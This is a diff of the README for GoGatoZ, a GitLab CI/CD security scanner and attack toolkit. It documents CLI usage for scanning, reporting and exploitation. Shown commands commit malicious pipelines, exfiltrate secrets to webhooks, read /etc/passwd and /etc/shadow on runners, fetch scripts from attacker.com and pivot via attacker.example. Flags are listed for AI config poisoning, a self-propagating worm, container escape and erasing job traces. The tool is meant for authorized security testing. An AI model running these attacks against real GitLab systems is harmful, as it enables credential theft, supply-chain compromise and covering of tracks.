@@ -1,325 +1,381 @@
-# GoGatoZ (GitLab Attack Toolkitz)
+# GoGatoZ
 
-GoGatoZ is the Golang port of Gato‑X, adapted for GitLab CI/CD instead of GitHub Actions.
-It provides multiple modes: search, enumerate, attack, pivot, secretscan, parse, report, notify, and mcp.
+**GitLab CI/CD security scanner and attack toolkit** -- the Go port of [Gato-X](https://github.com/AdnaneKhan/Gato-X), adapted for GitLab.
 
-GoGatoZ is hosted on GitHub at [mr-pmillz/gogatoz](https://github.com/mr-pmillz/gogatoz), with CI/CD on GitHub Actions and documentation published via GitHub Pages. The tool itself targets GitLab CI/CD as its scanning and attack surface.
+GoGatoZ discovers GitLab projects, scans their CI/CD configurations for security vulnerabilities, exploits misconfigurations, and maps attack paths with BloodHound-CE integration.
+
+<!-- badges -->
+
+## Features
+
+- **Search** -- discover GitLab projects by name, language, topic, code content, or file path patterns
+- **Enumerate** -- scan `.gitlab-ci.yml` pipelines for 37 finding types across includes, runners, secrets, injection, supply chain, and LOTP vectors
+- **Attack** -- 15+ exploitation modules: CI injection, secrets exfiltration, deploy keys, runner-on-runner, AI poisoning, supply chain attacks, and more
+- **Pivot** -- automated BFS lateral movement: enumerate, attack, harvest tokens, validate, and repeat at depth
+- **SecretScan** -- clone and scan repos for leaked secrets via TruffleHog, Gitleaks, or Titus
+- **BloodHound** -- export CI/CD attack surface graphs to BloodHound-CE with 10 pre-built Cypher attack path queries
+- **Report** -- generate HTML, SARIF, GitLab SAST, JSON, JSONL, or text reports with interactive charts
+- **Notify** -- send findings to Discord, Apprise, or raw webhooks
+- **PBOM** -- Pipeline Bill of Materials in native JSON or CycloneDX 1.5 format
+- **MCP** -- Model Context Protocol server for AI-assisted scanning via Claude Code
+- **API Server** -- REST/NDJSON HTTP interface for tooling integration
+- **Compliance scoring** -- A-E letter grades with false positive filtering
+- **SOCKS5 proxy** -- route all traffic through SOCKS5 proxies (with optional auth)
+- **Rate limiting** -- token-bucket rate limiter with adaptive jittered backoff for 429/5xx
+- **SQLite persistence** -- automatic result storage for querying across sessions
 
 ## Installation
 
-Install the latest release with `go install`:
+### go install
 
 ```bash
 go install github.com/mr-pmillz/gogatoz@latest
 ```
 
-Pull and run the container image from GitHub Container Registry (GHCR):
+### Docker (GHCR)
 
 ```bash
 docker pull ghcr.io/mr-pmillz/gogatoz:latest
-docker run --rm ghcr.io/mr-pmillz/gogatoz:latest --help
+docker run --rm -e GITLAB_TOKEN=glpat-xxx ghcr.io/mr-pmillz/gogatoz:latest --help
 ```
 
-Prebuilt binaries for each platform are attached to the [GitHub Releases page](https://github.com/mr-pmillz/gogatoz/releases).
+Multi-arch images (amd64/arm64) are tagged with the version (`v1.2.3`) and `latest`.
 
-## Quick Start (GitLab)
+### Prebuilt Binaries
 
-1. Create a GitLab Personal Access Token (PAT) with scopes: `api`, `read_repository` (and `write_repository` for attack modules).
-2. Export the token and optionally the GitLab URL (for self‑hosted instances). For internal GitLab with custom CAs or self-signed certs, see TLS flags below:
+Download from the [GitHub Releases page](https://github.com/mr-pmillz/gogatoz/releases).
+
+## Quick Start
 
 ```bash
-export GITLAB_TOKEN=glpat_xxx
-export GITLAB_URL=https://gitlab.com
+# 1. Export your GitLab token (api + read_repository scopes; write_repository for attack)
+export GITLAB_TOKEN=glpat-xxx
+
+# 2. Search for projects
+gogatoz search -q "deploy" --per-page 20 --max-pages 1
+
+# 3. Enumerate CI/CD risks
+gogatoz enumerate --input targets.txt --concurrency 16 --json
+
+# 4. Generate an HTML report
+gogatoz report --input results.jsonl --output report.html
+
+# Pipeline: search -> enumerate -> report
+gogatoz search -q "runner" --format jsonl \
+  | gogatoz enumerate --input - --format jsonl \
+  | gogatoz report --input /dev/stdin --output report.html
 ```
 
-3. Build and run the CLI:
+For self-hosted GitLab instances, set `--gitlab-url` or `export GITLAB_URL=https://gitlab.internal`. Use `--insecure-skip-tls-verify` or `--ca-cert /path/to/ca.pem` for custom TLS.
+
+## Commands
+
+### search
+
+Discover GitLab projects via the API with rich filtering.
 
 ```bash
-go build -o gogatoz .
-./gogatoz version
-./gogatoz search --query "runner" --per-page 20 --max-pages 1
+# Basic search
+gogatoz search -q "runner" --per-page 50 --max-pages 0
+
+# Filter by language + topic
+gogatoz search -q "ci" --language go,python --topic security,devops --format jsonl
+
+# Filter by code content
+gogatoz search -q "runner" --code-content "tags: self-hosted" --code-per-page 10
+
+# Filter by file path pattern
+gogatoz search -q "deploy" --path-pattern "ci/**/deploy?.yml" --path-ref main
+
+# Membership/ownership filters
+gogatoz search -q "infra" --membership --visibility private
 ```
 
-- Use --json for machine‑readable output.
+Key flags: `--query`, `--language`, `--topic`, `--code-content`, `--path-pattern`, `--path-exists`, `--visibility`, `--membership`, `--owned`, `--archived-only`, `--format`, `--output`. Set `--max-pages 0` to fetch all pages.
 
-Code content filter example (filters projects to those whose repository contains CI keywords):
+### enumerate
+
+Scan projects for CI/CD configuration vulnerabilities. Detects 37 finding types including include risks, runner exposure, MR-triggered jobs, variable injection, artifact poisoning, plaintext secrets, fork risks, script injection, LOTP tool execution, OIDC token exposure, cache poisoning, and more.
 
 ```bash
-./gogatoz search -q "runner" --code-content "tags: self-hosted" --code-per-page 10 --code-max-pages 1 --json
+# Scan from file
+gogatoz enumerate --input targets.txt --concurrency 16 --timeout 20s --json
+
+# Deep include resolution
+gogatoz enumerate --input targets.txt --deep --follow-includes --include-depth 5
+
+# Expand groups into projects
+gogatoz enumerate --group myorg/platform --group-recursive --format jsonl
+
+# With runners and protected branch info
+gogatoz enumerate --input targets.txt --runners --protected-branches --score
+
+# Output as SARIF + HTML
+gogatoz enumerate --input targets.txt --format html --output report.html --sarif-output scan.sarif
+
+# Pipe from search
+gogatoz search -q "runner" --format jsonl | gogatoz enumerate --input - --only-findings --json
 ```
 
-Path pattern filter examples (filter projects to those whose repo paths match a glob):
+Key flags: `--input`, `--group`, `--groups`, `--concurrency`, `--timeout`, `--follow-includes`, `--include-depth`, `--deep`, `--runners`, `--runners-scope`, `--protected-branches`, `--score`, `--filter-false-positives`, `--only-findings`, `--redacted`, `--log-scrape`, `--format`, `--sarif-output`, `--glsast-output`, `--bloodhound-export`, `--webhook-url`.
+
+### attack
+
+Exploit CI/CD misconfigurations with 15+ attack modules.
+
+**CI Pipeline Injection:**
 
 ```bash
-# Projects containing a .gitlab-ci.yml anywhere in the repo
-./gogatoz search -q "runner" --path-pattern ".gitlab-ci.yml" --json
+# Commit CI from file
+gogatoz attack -t group/project --commit-ci --ci-file payload.yml --branch exfil-branch
 
-# Projects with any deploy YAML under a ci/ subtree (supports ** and ?)
-./gogatoz search -q "deploy" --path-pattern "ci/**/deploy?.yml" --path-ref main --path-per-page 100 --path-max-pages 10 --json
+# Commit a built-in payload template
+gogatoz attack -t group/project --commit-ci --payload secrets --webhook https://hook.site/xxx
+
+# Render payload locally without committing
+gogatoz attack --payload-only --payload ror-shell --tags self-hosted --cmd 'id; uname -a'
 ```
 
-Language/topic filter examples and JSONL export:
+**Secrets Exfiltration:**
 
 ```bash
-# Filter to projects that contain Go or Python code (any-of via /languages)
-./gogatoz search -q "runner" --language go,python --format jsonl --output results.jsonl
+# Via CI job with RSA encryption
+gogatoz attack -t group/project --secrets --branch exfil --pubkey-file key.pem
 
-# Filter to projects that have topic/tag "security" or "devops"
-./gogatoz search -q "ci" --topic security,devops --per-page 100 --max-pages 0
+# Dump project/group variables via API
+gogatoz attack -t group/project --secrets --project-vars --group-vars --group-id myorg --json
 ```
 
-Note: --max-pages=0 fetches all pages until there are no more.
-
-Self-hosted/internal instance example for search:
+**Runner-on-Runner (RoR):**
 
 ```bash
-# Prefer the global --gitlab-url flag (per-command --instance is deprecated)
-./gogatoz search --gitlab-url https://gitlab.internal.local -q "ci" \
-  --path-pattern ".gitlab-ci.yml" --insecure-skip-tls-verify
-```
-
-Enumerate example:
-
-```bash
-./gogatoz enumerate --input targets.txt --concurrency 16 --timeout 20s --json
-```
-
-Pipe search results (JSONL) into enumerate (auto-detected input format):
-
-```bash
-./gogatoz search -q "runner" --format jsonl \
-  | ./gogatoz enumerate --input - --concurrency 32 --format jsonl --output results.jsonl
-```
-
-Attack examples:
-- Commit a custom CI pipeline to a new branch (implemented):
-```bash
-# Inline YAML
-./gogatoz attack -t group/project --commit-ci --ci-yaml 'stages: [test]\njob: { script: ["echo pwn"] }'
-
-# From file
-./gogatoz attack -t group/project --commit-ci --ci-file ./pipeline.yml --branch exfil-branch
-
-# From stdin
-cat pipeline.yml | ./gogatoz attack -t group/project --commit-ci --ci-stdin --branch test-attack
-```
-- Render payload YAML locally (--payload-only):
-```bash
-# Render a webshell payload (runner-on-runner shell) that runs a command on tagged runners
-./gogatoz attack --payload-only \
-  --payload ror-shell \
-  --job-name shell \
-  --tags self-hosted,linux \
-  --cmd 'id; uname -a'
-
-# Render a Pwn Request (MR-based) payload that executes the MR description when targeting main|prod
-./gogatoz attack --payload-only \
-  --payload pwn-request \
-  --job-name pwn \
-  --target-branch-regex 'main|prod'
-```
-- Secrets exfiltration:
-```bash
-./gogatoz attack -t group/project --secrets --branch exfil-branch --tags self-hosted --pubkey-file ./pubkey.pem
-```
-- Secrets API dump (project and group variables):
-```bash
-# Dump project variables to JSON
-./gogatoz attack -t group/project --secrets --project-vars --json
-
-# Dump group variables (requires group ID or full path)
-./gogatoz attack -t group/project --secrets --group-vars --group-id mygroup/subgroup --json
-
-# Include protected variables
-./gogatoz attack -t group/project --secrets --project-vars --group-vars --group-id 123 --include-protected --json
-```
-- Runner discovery and targeting:
-```bash
-# Discover available runner tags for a project
-./gogatoz attack -t group/project --discover-tags
-
-# Filter by executor type
-./gogatoz attack -t group/project --discover-tags --executor docker --json
-
-# Discover tags and filter by shell executor
-./gogatoz attack -t group/project --discover-tags --executor shell
-```
-- Runner-on-Runner (RoR) attacks:
-```bash
-# Basic RoR shell payload with command execution
-./gogatoz attack -t group/project --commit-ci --payload ror-shell \
+gogatoz attack -t group/project --commit-ci --payload ror-shell \
   --tags self-hosted,linux --cmd 'whoami; cat /etc/passwd'
-
-# RoR with file download/exfiltration
-./gogatoz attack -t group/project --commit-ci --payload ror-shell \
-  --tags self-hosted --download /etc/shadow
-
-# Advanced RoR with remote script and keep-alive (heartbeat every 30s)
-./gogatoz attack -t group/project --commit-ci --payload runner-on-runner \
-  --tags self-hosted,windows --script-url https://attacker.com/payload.ps1 \
-  --os windows --keepalive 30
-
-# Auto-discover tags and commit RoR payload
-./gogatoz attack -t group/project --commit-ci --payload ror \
-  --executor docker --cmd 'id; uname -a'
-```
-- Branch deconflict strategies:
-```bash
-# Fail if branch exists (default behavior)
-./gogatoz attack -t group/project --commit-ci --ci-file payload.yml --deconflict fail
-
-# Append suffix if branch exists (gogatoz-attack-1, gogatoz-attack-2, etc.)
-./gogatoz attack -t group/project --commit-ci --ci-file payload.yml --deconflict suffix
-
-# Force overwrite existing branch
-./gogatoz attack -t group/project --commit-ci --ci-file payload.yml --deconflict force
-```
-- Cleanup mode (remove attack artifacts):
-```bash
-# Remove a specific branch
-./gogatoz attack -t group/project --cleanup --cleanup-branch gogatoz-attack
-
-# Remove .gitlab-ci.yml from a branch
-./gogatoz attack -t group/project --cleanup --cleanup-ci --branch exfil-branch
-
-# Revoke a deploy key by ID
-./gogatoz attack -t group/project --cleanup --revoke-deploy-key 12345
-
-# Remove a member by user ID
-./gogatoz attack -t group/project --cleanup --remove-member-id 67890
-
-# Comprehensive cleanup (remove branch, CI file, deploy key, and member)
-./gogatoz attack -t group/project --cleanup \
-  --cleanup-branch gogatoz-attack \
-  --cleanup-ci \
-  --revoke-deploy-key 12345 \
-  --remove-member-id 67890 --json
 ```
 
-## Configuration file (Viper)
+**Additional Modes:**
 
-You can provide defaults in a config file and override them with environment variables and flags.
+| Flag | Description |
+|------|-------------|
+| `--deploy-key` | Create a deploy key with write access |
+| `--add-member` | Add a user as project member |
+| `--ai-inject` | Poison AI config files (CLAUDE.md, .cursorrules, etc.) |
+| `--inject-script` | Modify repo scripts called by CI (workflow hopping) |
+| `--auto-merge` | Create MR, self-approve, and merge (supply chain) |
+| `--harvest` | Install git hooks on runner, harvest tokens via callbacks |
+| `--tamper-release` | Modify GitLab release metadata and asset links |
+| `--tamper-package` | Upload malicious packages to the Generic Packages registry |
+| `--tamper-tag` | Poison a git tag by replacing files (Trivy-style) |
+| `--lotp-inject` | Living off the Pipeline tool config injection |
+| `--variable-inject` | Inject malicious CI variables |
+| `--memory-dump` | Dump secrets from runner process memory |
+| `--container-escape` | Escape privileged Docker executor to host |
+| `--supply-chain-worm` | Self-propagating CI injection across sibling repos |
+| `--discover-tags` | Discover runner tags for a project |
+| `--cleanup` | Remove attack artifacts (branches, CI files, keys, members) |
+| `--cleanup-pipeline` | Delete a pipeline by ID (anti-forensics) |
+| `--cleanup-jobs` | Erase job traces on recent pipelines |
 
-- Location: pass --config or set GOGATOZ_CONFIG. If not set, ./.gogatoz.yaml is used if present.
-- Precedence: flags > environment variables > config file > built‑in defaults.
-- Environment variables follow the flag names uppercased with dashes replaced by underscores, e.g. FOLLOW_INCLUDES, INCLUDE_DEPTH, GITLAB_URL, TOKEN.
+Payload types for `--payload`: `ror-shell`, `pwn-request`, `ror`, `runner-on-runner`, `secrets`, `secrets-exfil`, `git-hook`, `cache-poison`.
 
-Example .gogatoz.yaml:
+Branch deconflict strategies (`--deconflict`): `fail` (default), `suffix`, `force`.
 
-```yaml
-# Global defaults
-gitlab-url: https://gitlab.com
-# You can omit token here and use env GITLAB_TOKEN instead
-json: true
-verbose: false
-# Reliability knobs (optional)
-rate-rps: 8        # requests per second
-rate-burst: 16     # burst size
-retry-max: 3       # retries on 429/5xx
-user-agent: GoGatoZ/0.1 (+docs)
+### pivot
 
-# Enumerate defaults
-input: ./targets.txt
-concurrency: 16
-timeout: 20s
-follow-includes: true
-include-depth: 3
-only-findings: false
-```
-
-Run with:
+Automated lateral movement via CI/CD secrets exfiltration in a BFS loop.
 
 ```bash
-./gogatoz enumerate --config .gogatoz.yaml
+gogatoz pivot \
+  -t group/project \
+  --external-url https://attacker.example:9443 \
+  --max-depth 3 \
+  --max-targets 50
+
+# Dry run (enumerate only)
+gogatoz pivot -t group/project --external-url https://attacker.example:9443 --dry-run
 ```
 
-## Reliability and rate limits
+Workflow: enumerate targets -> filter exploitable findings -> attack with secrets exfil via HTTP callback -> decrypt harvested data (RSA+AES) -> extract GitLab tokens -> validate -> repeat with new credentials at the next depth level.
 
-### Self-hosted/internal GitLab support
+Key flags: `--external-url`, `--max-depth`, `--max-targets`, `--max-credentials`, `--listen`, `--cleanup`, `--dry-run`, `--group`, `--rsa-key`, `--concurrency`.
 
-- Use --gitlab-url to point at your internal instance (e.g., https://gitlab.internal.local). You can also override per-command via --instance on search.
-- If your instance uses a self-signed or private CA certificate, either provide --ca-cert /path/to/ca.pem or use --insecure-skip-tls-verify for testing only.
-- If your instance uses a self-signed certificate or a private CA, you can:
-  - Provide additional CA certificates with --ca-cert / path and/or GOGATOZ_CA_CERT.
-  - As a last resort for testing, skip verification with --insecure-skip-tls-verify or GOGATOZ_INSECURE (not recommended in production).
-- These TLS options apply to all API calls and to remote include fetching in enumerate when enabled.
+### secretscan
 
-GitLab may throttle API requests. GoGatoZ uses a token bucket rate limiter and adaptive retries with jittered exponential backoff for 429/5xx responses.
-
-Global flags to tune behavior:
-- --rate-rps float (default 8): Max requests per second.
-- --rate-burst int (default 16): Token bucket burst size.
-- --retry-max int (default 3): Max retries on 429/502/503/504; set to 1 to disable retries.
-- --user-agent string: Custom User-Agent header.
-- --http-max-idle int: HTTP transport MaxIdleConns (default internal; set to tune pooling size).
-- --http-max-idle-per-host int: HTTP transport MaxIdleConnsPerHost.
-- --http-idle-timeout duration: HTTP transport IdleConnTimeout (e.g., 90s).
-- --http-tls-timeout duration: HTTP transport TLSHandshakeTimeout (e.g., 10s).
-- --http-expect-timeout duration: HTTP transport ExpectContinueTimeout (e.g., 1s).
-- --http-req-timeout duration: HTTP client overall request timeout (e.g., 30s).
-
-These can also be set via config keys or environment variables (GOGATOZ_RATE_RPS, GOGATOZ_RATE_BURST, GOGATOZ_RETRY_MAX, GOGATOZ_USER_AGENT, GOGATOZ_HTTP_MAX_IDLE, GOGATOZ_HTTP_MAX_IDLE_PER_HOST, GOGATOZ_HTTP_IDLE_TIMEOUT, GOGATOZ_HTTP_TLS_TIMEOUT, GOGATOZ_HTTP_EXPECT_TIMEOUT, GOGATOZ_HTTP_REQ_TIMEOUT).
-
-## Docker image
-
-You can use the prebuilt container image from GitHub Container Registry (GHCR), published by the release workflow.
-
-Examples:
-
-- Run the binary to show help:
+Clone GitLab projects and scan for leaked secrets using external tools.
 
 ```bash
-docker run --rm -it \
-  -e GITLAB_TOKEN=glpat_xxx \
-  -e GITLAB_URL=https://gitlab.com \
-  ghcr.io/mr-pmillz/gogatoz:latest --help
+# Auto-detect scanners and scan
+gogatoz secretscan --query "infra" --output-dir ./repos --concurrency 8
+
+# Specific scanners
+gogatoz secretscan --query "deploy" -o ./repos --scanners trufflehog,gitleaks
+
+# Scan pre-cloned repos
+gogatoz secretscan --scan-dir ./existing-repos --redact
+
+# Unauthenticated scan of public projects
+gogatoz secretscan --query "ci" -o ./repos --no-token --visibility public
 ```
 
-- Enumerate projects from a local file:
+Supported scanners (must be on PATH): TruffleHog, Gitleaks, Titus. Use `--scanners auto` (default) to detect all available.
+
+### bloodhound
+
+BloodHound-CE integration for visualizing CI/CD attack surfaces as dependency pwnage matrices. Models projects, jobs, runners, findings, and their relationships as a graph, enabling Cypher-based attack path discovery.
 
 ```bash
-# Assuming projects.txt is in the current directory
-docker run --rm -it \
-  -e GITLAB_TOKEN=glpat_xxx \
-  -v "$PWD/projects.txt":/work/projects.txt \
-  ghcr.io/mr-pmillz/gogatoz:latest enumerate -i /work/projects.txt --json
+# Export to OpenGraph ZIP
+gogatoz bloodhound export --session 1 --output attack-surface.zip
+
+# Export from JSONL file
+gogatoz bloodhound export --input results.jsonl --output attack-surface.zip
+
+# Upload schema to BloodHound-CE
+gogatoz bloodhound schema
+
+# Upload scan data
+gogatoz bloodhound upload --session 1
+
+# Install 10 pre-built Cypher attack path queries
+gogatoz bloodhound queries
 ```
 
-Released images are tagged with the version (e.g. `ghcr.io/mr-pmillz/gogatoz:v1.2.3`) and `latest`.
+**10 pre-built Cypher queries**: All Exploitable Findings, Dependency Pwnage Matrix (transitive chains), Cross-Project Include Map, Runner Blast Radius, Shared Runner Attack Surface, Downstream Trigger Chains, Remote Include Risk Map, Full Attack Surface Graph, Pivot Attack Chains, Secret and Credential Exposure.
 
-## MCP Server (Claude Code Integration)
+**Graph schema**: 10 node kinds (GitLab Instance, Group, Project, Runner, CI Config, Job, Finding, Secret, Pipeline, Credential) and 15 edge kinds including traversable attack edges (`CICD_DependsOn`, `CICD_IncludesProject`, `CICD_RunsOn`, `CICD_SharedRunner`, `CICD_PivotsTo`, etc.)
 
-GoGatoZ includes an MCP (Model Context Protocol) server for direct integration with Claude Code and other MCP-compatible clients.
+Also integrates with the `enumerate` command via `--bloodhound-export <path.zip>` for single-step scan-to-graph workflows.
 
-### Setup
+### report
 
-1. Copy `.mcp.json.example` to `.mcp.json` and update paths/tokens for your environment
-2. Restart Claude Code to pick up the MCP server
-
-### Tools
-
-The MCP server exposes two tools over stdio:
-
-- **search_projects** -- search GitLab for projects with filters (query, visibility, topic, language, path-exists)
-- **enumerate_projects** -- scan projects for CI/CD security vulnerabilities (includes, runners, secrets, injection)
-
-### Result Storage
-
-Pass `--db <path>` to persist all search and enumerate results in a local SQLite database:
+Generate reports from scan results.
 
 ```bash
-# Via CLI
-GITLAB_TOKEN=glpat-xxx ./gogatoz mcp --db results.sqlite3
+# HTML report with charts and searchable tables
+gogatoz report --input results.jsonl --output report.html
 
-# Via .mcp.json (Claude Code auto-starts the server)
+# From SQLite database
+gogatoz report --db results.sqlite3 --session 1 --output report.html
+
+# SARIF report
+gogatoz report --input results.jsonl --format sarif --output scan.sarif
+
+# GitLab SAST format
+gogatoz report --input results.jsonl --format glsast --output gl-sast-report.json
+
+# Text summary
+gogatoz report --input results.jsonl --format text --only-findings
+
+# With false positive filtering
+gogatoz report --input results.jsonl --filter-false-positives --output report.html
+```
+
+Supported formats: `html`, `text`, `json`, `jsonl`, `sarif`, `glsast`.
+
+### notify
+
+Send findings to external notification systems.
+
+```bash
+# Discord via Apprise
+gogatoz notify --input results.jsonl --apprise-url https://apprise.example/notify/apprise
+
+# Direct Discord webhook
+gogatoz notify --input results.jsonl --discord-webhook https://discord.com/api/webhooks/...
+
+# Dry run
+gogatoz notify --input results.jsonl --discord-webhook https://example.com --dry-run
+
+# From database
+gogatoz notify --db results.sqlite3 --session 1 --apprise-url https://apprise.example/notify/apprise
+
+# Piped from enumerate
+gogatoz enumerate -i targets.txt --json | gogatoz notify --discord-webhook https://discord.com/api/webhooks/...
+```
+
+### explain
+
+Look up finding codes and remediation guidance.
+
+```bash
+# Explain a specific finding
+gogatoz explain SCRIPT_INJECTION_RISK
+
+# List all 37 finding codes
+gogatoz explain --list
+
+# Full reference dump
+gogatoz explain --all --json
+```
+
+### pbom
+
+Generate a Pipeline Bill of Materials inventorying all container images and CI include references.
+
+```bash
+# Native PBOM JSON
+gogatoz pbom --project group/project --output pbom.json
+
+# CycloneDX 1.5 SBOM
+gogatoz pbom --project group/project --format cyclonedx --output sbom.json
+
+# Specific ref with include resolution
+gogatoz pbom --project group/project --ref v2.0.0 --follow-includes --include-depth 5
+```
+
+### query
+
+Query the local SQLite database for stored scan results, findings, and attack data.
+
+```bash
+gogatoz query sessions                      # List scan sessions
+gogatoz query projects                      # List scanned projects
+gogatoz query findings --session 1          # Show findings for a session
+gogatoz query attacks                       # Show attack results
+gogatoz query secrets                       # Show exfiltrated secrets
+gogatoz query credentials                   # Show harvested credentials (pivot)
+gogatoz query exfil                         # Show RoR listener callbacks
+gogatoz query sessions --format json        # JSON output
+```
+
+### parse
+
+Transform and deduplicate GoGatoZ output locally (no GitLab token required).
+
+```bash
+# Dedup search results before enumerate
+gogatoz search -q "vuln" --format jsonl | gogatoz parse dedup | gogatoz enumerate --input -
+
+# Dedup a file
+gogatoz parse dedup --input all-search.jsonl --output targets.jsonl
+```
+
+### api-server
+
+Start an HTTP server exposing enumeration, search, and auth endpoints via JSON/NDJSON.
+
+```bash
+gogatoz api-server --listen :8088 --base-url https://gitlab.com
+```
+
+### mcp
+
+Start a Model Context Protocol server over stdio for integration with Claude Code or other MCP-compatible clients.
+
+```bash
+gogatoz mcp --db results.sqlite3
+```
+
+Example `.mcp.json` for Claude Code:
+
+```json
 {
   "mcpServers": {
     "gogatoz": {
-      "command": "go",
-      "args": ["run", ".", "mcp", "--db", "gogatoz-results.sqlite3"],
-      "cwd": "/path/to/gogatoz",
+      "command": "gogatoz",
+      "args": ["mcp", "--db", "results.sqlite3"],
       "env": {
-        "GITLAB_TOKEN": "${YOUR_TOKEN_ENV_VAR}",
+        "GITLAB_TOKEN": "glpat-xxx",
         "GITLAB_URL": "https://gitlab.com"
       }
     }
@@ -327,94 +383,93 @@ GITLAB_TOKEN=glpat-xxx ./gogatoz mcp --db results.sqlite3
 }
 ```
 
-Results are auto-stored when the database is configured. Each search or enumerate call creates a session with full results and nested findings.
+Exposes `search_projects` and `enumerate_projects` tools over stdio.
 
-## HTML Reports
+## Output Formats
 
-Generate self-contained HTML reports with interactive charts (Chart.js), summary cards, and searchable/sortable DataTables:
+| Format | Flag | Description |
+|--------|------|-------------|
+| Text | `--format text` | Human-readable styled tables (default) |
+| JSON | `--format json` or `--json` | Single JSON object/array |
+| JSONL | `--format jsonl` | Newline-delimited JSON (streamable) |
+| HTML | `--format html` | Self-contained report with Chart.js and DataTables |
+| SARIF | `--format sarif` or `--sarif-output` | SARIF 2.1.0 for IDE/CI integration |
+| GitLab SAST | `--format glsast` or `--glsast-output` | GitLab Security Dashboard format |
 
-```bash
-# From enumerate JSONL results
-./gogatoz report --input results.jsonl --output report.html
+## Configuration
 
-# Directly from enumerate
-./gogatoz enumerate --input targets.txt --format html --output report.html
+### Precedence
 
-# From SQLite database
-./gogatoz report --db results.sqlite3 --session 1 --output report.html
+CLI flags > environment variables > config file > built-in defaults.
 
-# Only projects with findings
-./gogatoz report --input results.jsonl --only-findings --output report.html
+### Config File
+
+Pass `--config` or set `GOGATOZ_CONFIG`. Falls back to `./.gogatoz.yaml` if present. Generate a default config with `gogatoz config init`.
+
+```yaml
+gitlab-url: https://gitlab.com
+json: true
+rate-rps: 8
+rate-burst: 16
+retry-max: 3
+concurrency: 16
+timeout: 20s
+follow-includes: true
+include-depth: 3
 ```
 
-The report includes severity distribution charts, finding type breakdowns, infrastructure risk summaries, and CSV-exportable tables.
+### Environment Variables
 
-## Roadmap Highlights
+| Variable | Description | Default |
+|----------|-------------|---------|
+| `GITLAB_TOKEN` | GitLab PAT (scopes: `api`, `read_repository`; `write_repository` for attack) | -- |
+| `GITLAB_URL` | GitLab instance URL | `https://gitlab.com` |
+| `GOGATOZ_CONFIG` | Config file path | -- |
+| `GOGATOZ_DB` | SQLite database path | `~/.local/share/gogatoz/results.db` |
+| `GOGATOZ_RATE_RPS` | Max requests/sec | `8` |
+| `GOGATOZ_RATE_BURST` | Burst size | `16` |
+| `GOGATOZ_RETRY_MAX` | Max retries on 429/5xx | `3` |
+| `GOGATOZ_INSECURE` | Skip TLS verification | -- |
+| `GOGATOZ_CA_CERT` | Additional CA certificate path | -- |
+| `GOGATOZ_USER_AGENT` | Custom User-Agent | -- |
+| `GOGATOZ_SOCKS5_PROXY` | SOCKS5 proxy address (`host:port`) | -- |
+| `GOGATOZ_SOCKS5_USER` | SOCKS5 proxy username | -- |
+| `GOGATOZ_SOCKS5_PASS` | SOCKS5 proxy password | -- |
+| `GOGATOZ_BH_URL` | BloodHound-CE instance URL | -- |
+| `GOGATOZ_BH_TOKEN_ID` | BloodHound-CE API token ID | -- |
+| `GOGATOZ_BH_TOKEN_KEY` | BloodHound-CE API token key | -- |
+| `APPRISE_URL` | Apprise API URL for notify | -- |
+| `DISCORD_WEBHOOK` | Discord webhook URL for notify | -- |
+| `GOGATOZ_HTTP_MAX_IDLE` | HTTP MaxIdleConns | -- |
+| `GOGATOZ_HTTP_MAX_IDLE_PER_HOST` | HTTP MaxIdleConnsPerHost | -- |
+| `GOGATOZ_HTTP_IDLE_TIMEOUT` | HTTP IdleConnTimeout | -- |
+| `GOGATOZ_HTTP_TLS_TIMEOUT` | HTTP TLSHandshakeTimeout | -- |
+| `GOGATOZ_HTTP_EXPECT_TIMEOUT` | HTTP ExpectContinueTimeout | -- |
+| `GOGATOZ_HTTP_REQ_TIMEOUT` | HTTP overall request timeout | -- |
 
-- GitLab API v4 and GraphQL integration using official client.
-- Parser for `.gitlab-ci.yml` with vulnerability checks (rules/only/includes/variables, workflow rules), and modeling of default/before_script/after_script plus job image/services/artifacts/cache. Include resolution supports local, project, remote (guarded), template, and component (GraphQL-backed with inputs substitution).
-- Fast concurrent scanning engine for enumerate mode.
-- Attack modules for Runner‑on‑Runner and secrets dumping.
+## SOCKS5 Proxy Support
+
+Route all GitLab API traffic through a SOCKS5 proxy:
+
+```bash
+# No authentication
+gogatoz search -q "ci" --socks5-proxy proxy.internal:1080
+
+# With authentication
+gogatoz enumerate --input targets.txt \
+  --socks5-proxy proxy.internal:1081 \
+  --socks5-user proxyuser \
+  --socks5-pass proxypass
+
+# Via environment variables
+export GOGATOZ_SOCKS5_PROXY=proxy.internal:1080
+gogatoz enumerate --input targets.txt
+```
+
+## Documentation
+
+Full documentation is available at the [GoGatoZ docs site](https://mr-pmillz.github.io/gogatoz/).
 
 ## License
 
-GoGatoZ is licensed under the Apache License, Version 2.0 (LICENSE). The original Gato‑X project is © 2024 Adnan Khan.
-
-
-## Enumerate include resolution
-
-- By default, enumerate resolves transitive includes in .gitlab-ci.yml up to depth 2.
-- Flags:
-  - --follow-includes: enable/disable include resolution (default: true)
-  - --include-depth: maximum depth to resolve includes (default: 2)
-  - --deep: shorthand to enable deep include resolution (sets --follow-includes and bumps --include-depth to >=3)
-
-Example with include resolution disabled:
-
-```bash
-./gogatoz enumerate --input targets.txt --concurrency 16 --timeout 20s --follow-includes=false
-```
-
-Example using deep mode:
-
-```bash
-./gogatoz enumerate --input targets.txt --deep --json
-```
-
-
-
-## New: Using --payload with --commit-ci (2025-11-01)
-
-You can now use --payload as a CI content source when committing to a target repository. This makes it easy to select a known-good payload template without maintaining local files.
-
-Examples:
-
-- Commit a Pwn Request payload to a branch (MR-triggered job):
-
-```bash
-./gogatoz attack -t group/project --commit-ci \
-  --payload pwn-request \
-  --target-branch-regex 'main|prod' \
-  --branch pr-pwn
-```
-
-- Commit a Runner-on-Runner remote script payload (Linux):
-
-```bash
-./gogatoz attack -t group/project --commit-ci \
-  --payload ror \
-  --tags self-hosted,linux \
-  --script-url https://example.org/payload.sh \
-  --os linux
-```
-
-- Commit a Secrets Exfiltration payload with a webhook and artifact dump:
-
-```bash
-./gogatoz attack -t group/project --commit-ci \
-  --payload secrets \
-  --webhook https://webhook.internal/ingest \
-  --artifacts-path env.txt
-```
-
-Note: You can still render locally with --payload-only to inspect YAML before committing.
+GoGatoZ is licensed under the Apache License, Version 2.0. The original Gato-X project is (c) 2024 Adnan Khan.
